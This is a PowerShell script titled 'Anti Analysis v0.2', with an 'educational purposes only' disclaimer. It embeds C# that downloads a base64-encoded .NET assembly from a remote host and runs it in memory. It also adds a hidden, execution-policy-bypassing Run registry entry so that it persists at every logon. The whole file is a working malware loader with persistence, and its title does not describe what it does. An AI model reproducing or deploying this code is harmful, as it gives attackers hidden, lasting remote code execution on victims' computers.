<#

       │ Author     : NYAN CAT
       │ Name       : Anti Analysis v0.2
       │ Contact    : https://github.com/NYAN-x-CAT

       This program is distributed for educational purposes only.

#>



$code = @"

using System.Net;
using System.Reflection;
using System;
using System.Threading;

namespace Nyan
{
    public class Cat
    {
        public void Run()
        {
            using (WebClient wc = new WebClient())
            {
               // new Thread(() =>
              //  {
                    try
                    {
                        Assembly asm = AppDomain.CurrentDomain.Load(Convert.FromBase64String(wc.DownloadString("http://192.168.1.196/base64.txt")));
                        MethodInfo Metinf = asm.EntryPoint;
                        object InjObj = asm.CreateInstance(Metinf.Name);
                        object[] parameters = new object[1];  // C#
                        if (Metinf.GetParameters().Length == 0)
                        {
                            parameters = null; // VB.NET
                        }
                        Metinf.Invoke(InjObj, parameters);
                    }
                    catch { return; }
              //  })
              //  { IsBackground = false }.Start();
            }
        }
    }
}

"@

Try
{
New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name PowerShellPath -PropertyType String -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden -noexit -file $($MyInvocation.MyCommand.Definition)"
}
Catch{}

Add-Type -TypeDefinition $code;
$instance = New-Object Nyan.Cat;
$instance.Run();